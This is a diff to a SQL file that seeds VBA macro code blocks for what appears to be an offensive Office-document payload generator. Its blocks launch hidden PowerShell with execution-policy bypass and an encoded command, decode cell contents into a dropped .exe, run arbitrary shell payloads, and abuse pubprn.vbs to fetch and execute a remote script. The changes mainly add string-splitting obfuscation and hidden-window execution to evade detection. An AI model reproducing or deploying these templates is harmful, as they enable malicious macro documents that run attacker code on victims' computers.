@@ -208,7 +208,7 @@ End Function
 
 -- 2
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('RandomName', 'util', '
-Function GetRnd()
+Function GetRand()
     Dim r As String
     Dim i As Integer
      
@@ -220,7 +220,7 @@ Function GetRnd()
             r = Int((9 * rnd) + 1) & r
         End If
     Next i
-    GetRnd = r
+    GetRand = r
 End Function
 
 ');
@@ -242,8 +242,8 @@ Sub cutil(code As String)
     expath = Application.UserLibraryPath & rndname & ".exe"
     
     Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
-    path = Application.UserLibraryPath & GetRnd & ".txt"
-    expath = Application.UserLibraryPath & GetRnd & ".exe"
+    path = Application.UserLibraryPath & GetRand & ".txt"
+    expath = Application.UserLibraryPath & GetRand & ".exe"
     
     Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemOb" & "ject")
     Set file = scr.CreateTextFile(path, True)
@@ -283,7 +283,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PSCellEmbed', 'harn
 Sub |RANDOMNAME|()
     Dim x, c As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
-    c = "poW" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "l.eXe -nop -noni " & _
+    c = "poW" & Chr(101) & Chr(114) & Chr(83) & Chr(104) & Chr(101) & Chr(76) & "l.eXe -no" & "p -n" & "oni " & _
     "-win" & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(116) & Chr(121) & Chr(108) & Chr(101) & Chr(32) & Chr(104) & Chr(105) & Chr(100) & _
     "den " & Chr(45) & Chr(101) & Chr(120) & Chr(101) & Chr(99) & Chr(32) & Chr(98) & Chr(121) & Chr(112) & Chr(97) & Chr(115) & Chr(115) & "" & _
     " -e" & "nc " & x
@@ -337,7 +337,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('SaveToDisk', 'harne
 Sub |RANDOMNAME|()
     Dim p, pth As String
     Dim b
-    pth = Application.UserLibraryPath & GetRnd & Chr(46) & Chr(101) & Chr(120) & Chr(101)
+    pth = Application.UserLibraryPath & GetRand & Chr(46) & Chr(101) & Chr(120) & Chr(101)
     p = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     b = dec(p)
     Call rit(pth, b)
@@ -450,7 +450,7 @@ End Function
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'harness', '
 Sub |RANDOMNAME|()
     Dim c As String
-    c = Chr(34) & |PAYLOADTEXT| & Chr(34)
+    c = |PAYLOADTEXT|
     Shell(c)
 End Sub
 
@@ -479,7 +479,7 @@ End Sub
 --15
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
 Function cfile(b As String)
-    pth = Application.UserLibraryPath & GetRnd & ".txt"
+    pth = Application.UserLibraryPath & GetRand & ".txt"
     Dim f As Object
     Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
     Dim oF As Object
@@ -534,7 +534,10 @@ End Function
 --19
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('PUBPRN', 'harness', '
 Function |RANDOMNAME|()
-    Shell ("cs" & "crip" & "t C:\Wind" & "ows\Sys" & "tem32\Print" & "ing_Admin_Scri" & "pts\en-US\pub" & "prn.vbs localhost script:|URL|")
+    Dim q As String
+    q = "cs" & "crip" & "t C:\Wind" & "ows\Sys" & "tem32\Print" & "ing_Admin_Scri" & "pts\en-US\pub" & "prn.v" & "bs localhost script:|URL|"
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
+    s.Run q, 0
 End Function
 
 ');
